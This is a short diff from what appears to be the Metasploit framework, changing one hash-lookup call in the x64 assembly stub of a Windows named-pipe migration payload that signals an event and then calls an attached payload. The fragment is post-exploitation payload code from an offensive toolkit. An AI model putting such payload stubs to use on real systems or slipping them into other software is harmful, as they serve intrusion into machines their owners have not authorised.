@@ -32,7 +32,7 @@ module Payload::Windows::MigrateNamedPipe_x64
       mov rdi, qword [rsi+16]   ; The duplicated pipe handle is in the migrate context.
     signal_pipe_event:
       mov rcx, qword [rsi]      ; Event handle is pointed at by rsi
-      mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'SetEvent')}
+      mov r10d, #{block_api_hash('kernel32.dll', 'SetEvent')}
       call rbp                  ; SetEvent(handle)
     call_pipe_payload:
       call qword [rsi+8]        ; call the associated payload
